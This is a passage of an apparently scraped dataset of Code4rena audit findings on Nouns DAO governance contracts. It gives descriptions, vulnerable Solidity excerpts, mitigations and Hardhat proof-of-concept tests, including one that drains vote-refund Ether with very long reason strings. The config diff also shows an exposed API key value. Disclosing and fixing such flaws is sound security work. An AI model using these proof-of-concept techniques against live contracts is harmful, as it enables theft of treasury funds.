contracts/governance/NounsDAOLogicV2.sol\n\n184       function propose(\n185           address[] memory targets,\n186           uint256[] memory values,\n187           string[] memory signatures,\n188           bytes[] memory calldatas,\n189           string memory description\n190:      ) public returns (uint256) {\n\n851       function _burnVetoPower() public {\n852           // Check caller is pendingAdmin and pendingAdmin ≠ address(0)\n853:          require(msg.sender == vetoer, 'NounsDAO::_burnVetoPower: vetoer only');\n\n862:      function proposalThreshold() public view returns (uint256) {\n\n1002:     function maxQuorumVotes() public view returns (uint256) {\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L184-L190\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24449",
      "title": "[L-03]  Missing checks for `address(0x0)` when assigning values to `address` state variables",
      "impact": "LOW",
      "content": "\n*There are 5 instances of this issue:*\n```solidity\nFile: contracts/governance/NounsDAOLogicV1.sol\n\n605:          pendingAdmin = newPendingAdmin;\n\n642:          vetoer = newVetoer;\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L605\n\n```solidity\nFile: contracts/governance/NounsDAOLogicV2.sol\n\n807:          pendingAdmin = newPendingAdmin;\n\n844:          vetoer = newVetoer;\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L807\n\n```solidity\nFile: contracts/governance/NounsDAOProxy.sol\n\n71:           admin = admin_;\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOProxy.sol#L71\n\n## Non-Critical Issues\n| |Issue|Instances|\n|-|:-|:-:|\n| [N&#x2011;01] | `public` functions not called by the contract should be declared `external` instead | 8 |\n| [N&#x2011;02] | Non-assembly method available | 3 |\n| [N&#x2011;03] | `2**<n> - 1` should be re-written as `type(uint<n>).max` | 2 |\n| [N&#x2011;04] | `constant`s should be defined rather than using magic numbers | 8 |\n| [N&#x2011;05] | Use a more recent version of solidity | 3 |\n| [N&#x2011;06] | Expressions for constant values such as a call to `keccak256()`, should use `immutable` rather than `constant` | 6 |\n| [N&#x2011;07] | Constant redefined elsewhere | 11 |\n| [N&#x2011;08] | Lines are too long | 7 |\n| [N&#x2011;09] | Non-library/interface files should use fixed compiler versions, not floating ones | 4 |\n| [N&#x2011;10] | Event is missing `indexed` fields | 21 |\n| [N&#x2011;11] | Not using the named return variables anywhere in the function is confusing | 8 |\n| [N&#x2011;12] | Typos | 4 |\n\nTotal: 85 instances over 12 issues\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24448",
      "title": "[L-02]  Unused/empty `receive()`/`fallback()` function",
      "impact": "LOW",
      "content": "If the intention is for the Ether to be used, the function should call another function, otherwise it should revert (e.g. `require(msg.sender == address(weth))`). Having no access control on the function means that someone may send Ether to the contract, and have no way to get anything back out, which is a loss of funds\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/governance/NounsDAOLogicV2.sol\n\n1030:     receive() external payable {}\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L1030\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24447",
      "title": "[L-01]  Nouns will not be able to be transferred once the `block.number` passes `type(uint32).max`",
      "impact": "LOW",
      "content": "While this currently equates to ~1260 years, if there's a hard fork which makes block times much more frequent (e.g. to compete with Solana), then this limit may be reached much faster than expected, and transfers and delegations will remain stuck at their existing settings\n\n*There are 2 instances of this issue:*\n```solidity\nFile: /contracts/base/ERC721Checkpointable.sol\n\n238          uint32 blockNumber = safe32(\n239              block.number,\n240              'ERC721Checkpointable::_writeCheckpoint: block number exceeds 32 bits'\n241:         );\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L238-L241\n\n```solidity\nFile: /contracts/governance/NounsDAOLogicV2.sol\n\n923:         uint32 blockNumber = safe32(blockNumber_, 'NounsDAO::getDynamicQuorumParamsAt: block number exceeds 32 bits');\n\n```\nhttps://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L923\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24446",
      "title": "[M-03] Loss of Veto Power can Lead to 51% Attack",
      "impact": "MEDIUM",
      "content": "_Submitted by TomJ, also found by 0xDjango, 0xSmartContract, Aymen0909, Ch&#95;301, and Deivitto_\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L156>\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L150>\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L839-L845>\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L637-L643>\n\n### Impact\n\nThe veto power is import functionality for current NounsDAO in order to protect their treasury from malicious proposals.\nHowever there is lack of zero address check and lack of 2 step address changing process for vetoer address.\nThis might lead to Nounders losing their veto power unintentionally and open to 51% attack which can drain their entire treasury.\n\nRefrence from Nouns DAO contest documents:\n<https://dialectic.ch/editorial/nouns-governance-attack>\n<https://dialectic.ch/editorial/nouns-governance-attack-2>\n\n### Proof of Concept\n\nLack of 0-address check for vetoer address at `initialize()` and `\\_setVetoer()` of NounsDAOLogicV2.sol and NounsDAOLogicV1.sol.\nAlso it is better to make changing address process of vetoer at `\\_setVetoer()` into 2-step process to avoid accidently setting\nvetoer to zero address or any other arbitrary addresses and end up burning/losing veto power unintentionally.\n\n1.  Vetoer address of `initialize()` of NounsDAOLogicV2.sol, NounsDAOLogicV1.sol\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L156>\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L150>\n\n2.  Vetoer address of `\\_setVetoer()` of NounsDAOLogicV2.sol, NounsDAOLogicV1.sol\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L839-L845>\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L637-L643>\n\n### Recommended Mitigation Steps\n\nAdd zero address check for vetoer address at `initialize()`.\nAlso change `\\_setVetoer()` vetoer address changing process to 2-step process like explained below.\n\nFirst make the `\\_setVetoer()` function approve a new vetoer address as a pending vetoer.\nNext that pending vetoer has to claim the ownership in a separate transaction to be a new vetoer.\n\n**[eladmallel (Nouns DAO) confirmed and commented](https://github.com/code-423n4/2022-08-nounsdao-findings/issues/315#issuecomment-1232091787):**\n > We agree it's worth being extra safe here, planning to change it to a 2-step process.\n\n\n\n***\n\n\n\n",
      "summary": "\nThis bug report was submitted by TomJ and also found by 0xDjango, 0xSmartContract, Aymen0909, Ch&#95;301, and Deivitto. The bug concerns the lack of zero address check and lack of two-step address changing process for the vetoer address in the NounsDAOLogicV2.sol and NounsDAOLogicV1.sol contracts. This could lead to Nounders losing their veto power unintentionally, and open the treasury up to a 51% attack which could drain the entire treasury. \n\nThe lack of zero address check is found in the `initialize()` and `\\_setVetoer()` functions of the NounsDAOLogicV2.sol and NounsDAOLogicV1.sol contracts. The `\\_setVetoer()` function should be changed to a two-step process, where a new vetoer address is first approved as a pending vetoer, and then claimed in a separate transaction to be the new vetoer. Eladmallel (Nouns DAO) confirmed and commented that they agree it is worth being extra safe and plan to change it to a two-step process.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/315",
      "tags": [],
      "finders": []
    },
    {
      "id": "24445",
      "title": "[M-02] User A cannot cancel User B's proposal when User B's prior number of votes at relevant block is same as proposal threshold, which contradicts the fact that User B actually cannot create the proposal when the prior number of votes is same as proposal threshold",
      "impact": "MEDIUM",
      "content": "_Submitted by rbserver_\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/main/contracts/governance/NounsDAOLogicV2.sol#L184-L279>\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/main/contracts/governance/NounsDAOLogicV2.sol#L346-L368>\n\n### Impact\n\nWhen User B calls the following `propose` function for creating a proposal, it checks that User B's prior number of votes at the relevant block is larger than the proposal threshold through executing `nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold`. This means that User B cannot create the proposal when the prior number of votes and the proposal threshold are the same.\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/main/contracts/governance/NounsDAOLogicV2.sol#L184-L279>\n\n```solidity\n    function propose(\n        address[] memory targets,\n        uint256[] memory values,\n        string[] memory signatures,\n        bytes[] memory calldatas,\n        string memory description\n    ) public returns (uint256) {\n        ProposalTemp memory temp;\n\n        temp.totalSupply = nouns.totalSupply();\n\n        temp.proposalThreshold = bps2Uint(proposalThresholdBPS, temp.totalSupply);\n\n        require(\n            nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,\n            'NounsDAO::propose: proposer votes below proposal threshold'\n        );\n        require(\n            targets.length == values.length &&\n                targets.length == signatures.length &&\n                targets.length == calldatas.length,\n            'NounsDAO::propose: proposal function information arity mismatch'\n        );\n        require(targets.length != 0, 'NounsDAO::propose: must provide actions');\n        require(targets.length <= proposalMaxOperations, 'NounsDAO::propose: too many actions');\n\n        temp.latestProposalId = latestProposalIds[msg.sender];\n        if (temp.latestProposalId != 0) {\n            ProposalState proposersLatestProposalState = state(temp.latestProposalId);\n            require(\n                proposersLatestProposalState != ProposalState.Active,\n                'NounsDAO::propose: one live proposal per proposer, found an already active proposal'\n            );\n            require(\n                proposersLatestProposalState != ProposalState.Pending,\n                'NounsDAO::propose: one live proposal per proposer, found an already pending proposal'\n            );\n        }\n\n        temp.startBlock = block.number + votingDelay;\n        temp.endBlock = temp.startBlock + votingPeriod;\n\n        proposalCount++;\n        Proposal storage newProposal = _proposals[proposalCount];\n        newProposal.id = proposalCount;\n        newProposal.proposer = msg.sender;\n        newProposal.proposalThreshold = temp.proposalThreshold;\n        newProposal.eta = 0;\n        newProposal.targets = targets;\n        newProposal.values = values;\n        newProposal.signatures = signatures;\n        newProposal.calldatas = calldatas;\n        newProposal.startBlock = temp.startBlock;\n        newProposal.endBlock = temp.endBlock;\n        newProposal.forVotes = 0;\n        newProposal.againstVotes = 0;\n        newProposal.abstainVotes = 0;\n        newProposal.canceled = false;\n        newProposal.executed = false;\n        newProposal.vetoed = false;\n        newProposal.totalSupply = temp.totalSupply;\n        newProposal.creationBlock = block.number;\n\n        latestProposalIds[newProposal.proposer] = newProposal.id;\n\n        /// @notice Maintains backwards compatibility with GovernorBravo events\n        emit ProposalCreated(\n            newProposal.id,\n            msg.sender,\n            targets,\n            values,\n            signatures,\n            calldatas,\n            newProposal.startBlock,\n            newProposal.endBlock,\n            description\n        );\n\n        /// @notice Updated event with `proposalThreshold` and `minQuorumVotes`\n        /// @notice `minQuorumVotes` is always zero since V2 introduces dynamic quorum with checkpoints\n        emit ProposalCreatedWithRequirements(\n            newProposal.id,\n            msg.sender,\n            targets,\n            values,\n            signatures,\n            calldatas,\n            newProposal.startBlock,\n            newProposal.endBlock,\n            newProposal.proposalThreshold,\n            minQuorumVotes(),\n            description\n        );\n\n        return newProposal.id;\n    }\n```\n\nAfter User B's proposal is created, User A can call the following `cancel` function to cancel it. When calling `cancel`, it checks that User B's prior number of votes at the relevant block is less than the proposal threshold through executing `nouns.getPriorVotes(proposal.proposer, block.number - 1) < proposal.proposalThreshold`. When User B's prior number of votes and the proposal threshold are the same, User A cannot cancel this proposal of User B. However, this contradicts the fact User B actually cannot create this proposal when the same condition holds true. In other words, if User B cannot create this proposal when the prior number of votes and the proposal threshold are the same, User A should be able to cancel User B's proposal under the same condition but it is not true. The functionality for canceling User B's proposal in this situation becomes unavailable for User A.\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/main/contracts/governance/NounsDAOLogicV2.sol#L346-L368>\n\n```solidity\n    function cancel(uint256 proposalId) external {\n        require(state(proposalId) != ProposalState.Executed, 'NounsDAO::cancel: cannot cancel executed proposal');\n\n        Proposal storage proposal = _proposals[proposalId];\n        require(\n            msg.sender == proposal.proposer ||\n                nouns.getPriorVotes(proposal.proposer, block.number - 1) < proposal.proposalThreshold,\n            'NounsDAO::cancel: proposer above threshold'\n        );\n\n        proposal.canceled = true;\n        for (uint256 i = 0; i < proposal.targets.length; i++) {\n            timelock.cancelTransaction(\n                proposal.targets[i],\n                proposal.values[i],\n                proposal.signatures[i],\n                proposal.calldatas[i],\n                proposal.eta\n            );\n        }\n\n        emit ProposalCanceled(proposalId);\n    }\n```\n\n### Proof of Concept\n\nPlease append the following test in the `NounsDAOV2#inflationHandling` `describe` block in `test\\governance\\NounsDAO\\V2\\inflationHandling.test.ts`. This test should pass to demonstrate the described scenario.\n\n```typescript\n  it(\"User A cannot cancel User B's proposal when User B's prior number of votes at relevant block is same as proposal threshold, which contradicts the fact that User B actually cannot create the proposal when the prior number of votes is same as proposal threshold\",\n    async () => {\n    // account1 has 3 tokens at the beginning\n    // account1 gains 2 more to own 5 tokens in total\n    await token.transferFrom(deployer.address, account1.address, 11);\n    await token.transferFrom(deployer.address, account1.address, 12);\n\n    await mineBlock();\n\n    // account1 cannot create a proposal when owning 5 tokens in total\n    await expect(\n      gov.connect(account1).propose(targets, values, signatures, callDatas, 'do nothing'),\n    ).to.be.revertedWith('NounsDAO::propose: proposer votes below proposal threshold');\n\n    // account1 gains 1 more to own 6 tokens in total\n    await token.transferFrom(deployer.address, account1.address, 13);\n\n    await mineBlock();\n\n    // account1 can create a proposal when owning 6 tokens in total\n    await gov.connect(account1).propose(targets, values, signatures, callDatas, 'do nothing');\n    const proposalId = await gov.latestProposalIds(account1.address);\n    expect(await gov.state(proposalId)).to.equal(0);\n\n    // other user cannot cancel account1's proposal at this moment\n    await expect(\n      gov.cancel(proposalId, {gasLimit: 1e6})\n    ).to.be.revertedWith('NounsDAO::cancel: proposer above threshold');\n    \n    // account1 removes 1 token to own 5 tokens in total\n    await token.connect(account1).transferFrom(account1.address, deployer.address, 13);\n\n    await mineBlock();\n\n    // other user still cannot cancel account1's proposal when account1 owns 5 tokens in total\n    // this contradicts the fact that account1 cannot create a proposal when owning 5 tokens in total\n    await expect(\n      gov.cancel(proposalId, {gasLimit: 1e6})\n    ).to.be.revertedWith('NounsDAO::cancel: proposer above threshold');\n\n    // account1 removes another token to own 4 tokens in total\n    await token.connect(account1).transferFrom(account1.address, deployer.address, 12);\n\n    await mineBlock();\n\n    // other user can now cancel account1's proposal when account1 owns 4 tokens in total\n    await gov.cancel(proposalId, {gasLimit: 1e6})\n    expect(await gov.state(proposalId)).to.equal(2);\n  });\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/main/contracts/governance/NounsDAOLogicV2.sol#L197-L200> can be changed to the following code.\n\n```solidity\n        require(\n            nouns.getPriorVotes(msg.sender, block.number - 1) >= temp.proposalThreshold,\n            'NounsDAO::propose: proposer votes below proposal threshold'\n        );\n```\n\nor\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/main/contracts/governance/NounsDAOLogicV2.sol#L350-L354> can be changed to the following code.\n\n```solidity\n        require(\n            msg.sender == proposal.proposer ||\n                nouns.getPriorVotes(proposal.proposer, block.number - 1) <= proposal.proposalThreshold,\n            'NounsDAO::cancel: proposer above threshold'\n        );\n```\n\nbut not both.\n\n**[eladmallel (Nouns DAO) confirmed and commented](https://github.com/code-423n4/2022-08-nounsdao-findings/issues/255#issuecomment-1232013574):**\n > We agree that the case of prior votes equal to `proposalThreshold` is missed, and plan to include that state in what is cancelable.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the Nouns DAO contract, which is used for governance purposes in a decentralized application. The bug is that when a user (User B) creates a proposal, it checks that the user's prior number of votes at the relevant block is larger than the proposal threshold. However, when another user (User A) calls the `cancel` function to cancel the proposal, it checks that User B's prior number of votes at the relevant block is less than the proposal threshold, which means that if User B cannot create the proposal when the prior number of votes and the proposal threshold are the same, User A should be able to cancel User B's proposal under the same condition but it is not true. This means that the functionality for canceling User B's proposal in this situation becomes unavailable for User A.\n\nThe recommended mitigation steps for this bug are to either change the code in the `propose` function to require that the prior number of votes is greater than or equal to the proposal threshold, or to change the code in the `cancel` function to require that the prior number of votes is less than or equal to the proposal threshold, but not both. The bug will be fixed by adding the state of prior votes equal to the proposal threshold to what is cancelable.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/255",
      "tags": [],
      "finders": []
    },
    {
      "id": "24444",
      "title": "[M-01] Voters can burn large amounts of Ether by submitting votes with long reason strings",
      "impact": "MEDIUM",
      "content": "_Submitted by Respx_\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L518-L524>\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L533-L544>\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L98>\n\n### Vulnerability Details\n\nVoters can burn large amounts of Ether by submitting votes with long reason strings\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L518-L524>\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L533-L544>\n\n<https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L98>\n\nThe only limits to how long a string argument to a function call can be is the block gas limit of the EVM, currently 30 million. It is therefore possible for a user to call `NounsDAOLogicV2.castRefundableVoteWithReason()` with a very, very long `reason` string. `castRefundableVoteInternal()` emits an event that includes `reason` on line 540, which is within the region of code covered by gas refunds (gas refunds are measured from `startGas` on line 538). Because of this, gas refunds will include the gas price of emitting this event, which could potentially be very large.\n\n### Impact\n\nThis issue is partially mitigated by the fact that the voter will still bear the cost of the massive calldata usage. `NounsDAOLogicV2` covers this with a fixed value of `REFUND_BASE_GAS` (36000), but the real transaction overhead is far larger when submitting a `reason` string that is many thousands of characters in length. Therefore, the voter ends up losing roughly as much as is drained from the `NounsDAOLogicV2` contract by the refund.\nNonetheless, I still think this is a valid high funding as the protocol will not want to rely purely on this economic protection. Some risk scenarios:\n\n1.  It is quite possible that calldata prices could decrease in future, perhaps as part of catering for rollups. This could make the attack suddenly far more viable.\n2.  A voter might have some motive to want to emit some arbitrary text as an Ethereum event, and simply exploit this system to do so.\n3.  A voter might want to maliciously drain the Ether, perhaps to damage the protocol's reputation.\n4.  As in 3, this could be achieved by emptying out the last funds in \\`\\`NounsDAOLogicV2\\` and so denying many other voters their voting refunds.\n\n### Tools Used\n\nHardhat testing\n\n### Recommended Mitigation Steps\n\n2 alternative ideas:\n\n1.  Move the `emit VoteCast` outside of the gas calculation region of the code and increase `REFUND_BASE_GAS` to cover an event with a reasonable length of string.\n2.  Change the type of `reason` to `bytes` and add a check to its length in `castRefundableVoteWithReason()`, reverting if it is too long.\n\n### Proof of Concept\n\nThe single vote in this test burns around 0.25 Ether from the `NounsDAOLogicV2` contract.\nThis test runs slowly and is assuming a base fee of 500 gwei. Obviously if the base fee were higher, the gas burnt would also be higher.\nThe numbers are printed out with a rather messy `console.log()` in the middle of the test output. Apologies for the bad presentation, but on the bright side you can adjust the numbers and see different results.\n\n```diff\ndiff --git a/hardhat.config.ts b/hardhat.config.ts\nindex 6d469b0..dc51148 100644\n--- a/hardhat.config.ts\n+++ b/hardhat.config.ts\n@@ -34,7 +34,7 @@ const config: HardhatUserConfig = {\n         : [process.env.WALLET_PRIVATE_KEY!].filter(Boolean),\n     },\n     hardhat: {\n-      initialBaseFeePerGas: 0,\n+      initialBaseFeePerGas: 500_000_000_000,\n     },\n   },\n   etherscan: {\n@@ -50,12 +50,12 @@ const config: HardhatUserConfig = {\n   gasReporter: {\n     enabled: !process.env.CI,\n     currency: 'USD',\n-    gasPrice: 50,\n+    gasPrice: 500,\n     src: 'contracts',\n     coinmarketcap: '7643dfc7-a58f-46af-8314-2db32bdd18ba',\n   },\n   mocha: {\n-    timeout: 60_000,\n+    timeout: 600_000,\n   },\n };\n export default config;\n```\n\n```diff\ndiff --git a/test/governance/NounsDAO/V2/voteRefund.test.ts b/test/governance/NounsDAO/V2/voteRefundPOC.test.ts\nindex d34ff4b..4c268a3 100644\n--- a/test/governance/NounsDAO/V2/voteRefund.test.ts\n+++ b/test/governance/NounsDAO/V2/voteRefundPOC.test.ts\n@@ -162,6 +162,30 @@ describe('Vote Refund', () => {\n   });\n \n   describe('castRefundableVoteWithReason', () => {\n+    it(\"accepts excessively long reason strings\", async () => {\n+      await fundGov();\n+      const balanceBefore = await user.getBalance();\n+      const govBalanceBefore = await ethers.provider.getBalance(gov.address);\n+      const tx = await gov\n+        .connect(user)\n+        .castRefundableVoteWithReason(1, 1, junkString(50_000), {\n+          maxPriorityFeePerGas: MAX_PRIORITY_FEE_CAP,\n+          gasLimit: 24000000,\n+        });\n+      const r = await tx.wait();\n+      const balanceDiff = balanceBefore.sub(await user.getBalance());\n+      const govBalanceDiff = govBalanceBefore.sub(\n+        await ethers.provider.getBalance(gov.address)\n+      );\n+      const govBalanceAfter = await ethers.provider.getBalance(gov.address);\n+      console.log(\"USER BALANCE DIFF:\", ethers.utils.formatEther(balanceDiff));\n+      console.log(\n+        \"GOV BALANCE DIFF:\",\n+        ethers.utils.formatEther(govBalanceDiff)\n+      );\n+      console.log(\"TX COST:\", ethers.utils.formatEther(await txCostInEth(r)));\n+\n+    });\n     it('refunds users with votes', async () => {\n       await fundGov();\n       const balanceBefore = await user.getBalance();\n@@ -284,6 +308,15 @@ describe('Vote Refund', () => {\n     expect(refundEvent!.args!.refundAmount).to.be.closeTo(expectedCost, REFUND_ERROR_MARGIN);\n   }\n \n+  function junkString(iterations: number = 100) {\n+    var x = \"Ab Cd Ef Gh Ij \";\n+    const y = \"Ab Cd Ef Gh Ij\";\n+    for (var i = 0; i < iterations; i++) {\n+      x += y;\n+    }\n+    return x;\n+  }\n+\n   async function submitProposal(u: SignerWithAddress) {\n     await gov\n       .connect(u)\n```\n\n**[eladmallel (Nouns DAO) disagreed with severity and commented](https://github.com/code-423n4/2022-08-nounsdao-findings/issues/174#issuecomment-1232002119):**\n > We acknowledge that a Noun holder can push the refund amount up with a long reason string. We think this is low risk since again this is capped by the number of proposals one can vote on, furthermore buying an expensive Noun just to perform this no-profit attack seems unlikely at the moment.\n> \n> Having said that, we do plan to mitigate this concern by adding a cap on the `gasUsed` variable used in the refund calculation.\n\n**[gzeoneth (judge) decreased severity to Medium](https://github.com/code-423n4/2022-08-nounsdao-findings/issues/174)**\n\n***\n\n",
      "summary": "\nThis bug report was submitted by Respx and involves the NounsDAOLogicV2 code on the Ethereum Virtual Machine (EVM). It is possible for a user to call the `NounsDAOLogicV2.castRefundableVoteWithReason()` function with a very long `reason` string, which can cause the Ether in the `NounsDAOLogicV2` contract to be drained. The only limit to the length of the string argument is the block gas limit of the EVM. \n\nThe impact of this issue is partially mitigated by the fact that the voter will still bear the cost of the massive calldata usage. However, the risk scenarios are still present, such as if calldata prices were to decrease in the future, a voter might have some motive to want to emit some arbitrary text as an Ethereum event, a voter might want to maliciously drain the Ether, or the last funds in the `NounsDAOLogicV2` contract could be emptied out.\n\nThe tools used to identify this vulnerability were Hardhat testing. To mitigate this issue, two alternative ideas have been proposed: move the `emit VoteCast` outside of the gas calculation region of the code and increase `REFUND_BASE_GAS` to cover an event with a reasonable length of string, or change the type of `reason` to `bytes` and add a check to its length in `castRefundableVoteWithReason()`, reverting if it is too long.\n\nA proof of concept is provided which shows that a single vote can burn around 0.25 Ether from the `NounsDAOLogicV2` contract, assuming a base fee of 500 gwei. Eladmallel (Nouns DAO) disagreed with the severity of this issue and commented that it is low risk since it is capped by the number of proposals one can vote on. Gzeoneth (judge) decreased the severity to Medium.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2022-08-nounsdao",
      "github_link": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/174",
      "tags": [],
      "finders": []
    },
    {
      "id": "24443",
      "title": "[H-01] ERC721Checkpointable: delegateBySig allows the user to vote to address 0, which causes the user to permanently lose his vote and cannot transfer his NFT.",
      "impact": "HIGH",
      "content": "_Submitted by cccz, also found by berndartmueller, bin2chen, csanuragjain, IEatBabyCarrots, jayphbee, KIntern&#95;NA, Lambda, and zzzitron_\n\nIn the ERC721Checkpointable contract, when the user votes with the delegate function, the delegatee will not be address 0.\n\n        function delegate(address delegatee) public {\n            if (delegatee == address(0)) delegatee = msg.sender;\n            return _delegate(msg.sender, delegatee);\n        }\n\nHowever, there is no such restriction in the delegateBySig function, which allows the user to vote to address 0.\n\n        function delegateBySig(\n            address delegatee,\n            uint256 nonce,\n            uint256 expiry,\n            uint8 v,\n            bytes32 r,\n            bytes32 s\n        ) public {\n            bytes32 domainSeparator = keccak256(\n                abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name())), getChainId(), address(this))\n            );\n            bytes32 structHash = keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry));\n            bytes32 digest = keccak256(abi.encodePacked('\\x19\\x01', domainSeparator, structHash));\n            address signatory = ecrecover(digest, v, r, s);\n            require(signatory != address(0), 'ERC721Checkpointable::delegateBySig: invalid signature');\n            require(nonce == nonces[signatory]++, 'ERC721Checkpointable::delegateBySig: invalid nonce');\n            require(block.timestamp <= expiry, 'ERC721Checkpointable::delegateBySig: signature expired');\n            return _delegate(signatory, delegatee);\n        }\n\nIf user A votes to address 0 in the delegateBySig function, \\_delegates\\[A] will be address 0, but the delegates function will return the address of user A and getCurrentVotes(A) will return 0.\n\n        function _delegate(address delegator, address delegatee) internal {\n            /// @notice differs from `_delegate()` in `Comp.sol` to use `delegates` override method to simulate auto-delegation\n            address currentDelegate = delegates(delegator);\n\n            _delegates[delegator] = delegatee;\n    ...\n        function delegates(address delegator) public view returns (address) {\n            address current = _delegates[delegator];\n            return current == address(0) ? delegator : current;\n        }\n\nLater, if user A votes to another address or transfers NFT, the \\_moveDelegates function will fail due to overflow, which makes user A lose votes forever and cannot transfer NFT.\n\n        function _moveDelegates(\n            address srcRep,\n            address dstRep,\n            uint96 amount\n        ) internal {\n            if (srcRep != dstRep && amount > 0) {\n                if (srcRep != address(0)) {\n                    uint32 srcRepNum = numCheckpoints[srcRep];\n                    uint96 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;\n                    uint96 srcRepNew = sub96(srcRepOld, amount, 'ERC721Checkpointable::_moveDelegates: amount underflows'); // auditor : overflow here\n                    _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);\n                }\n\nOn the other hand, since the burn function also fails, this can also be used to prevent the NFT from being burned by the minter\n\n        function burn(uint256 nounId) public override onlyMinter {\n            _burn(nounId);\n            emit NounBurned(nounId);\n        }\n    ...\n        function _burn(uint256 tokenId) internal virtual {\n            address owner = ERC721.ownerOf(tokenId);\n\n            _beforeTokenTransfer(owner, address(0), tokenId);\n    ...\n        function _beforeTokenTransfer(\n            address from,\n            address to,\n            uint256 tokenId\n        ) internal override {\n            super._beforeTokenTransfer(from, to, tokenId);\n\n            /// @notice 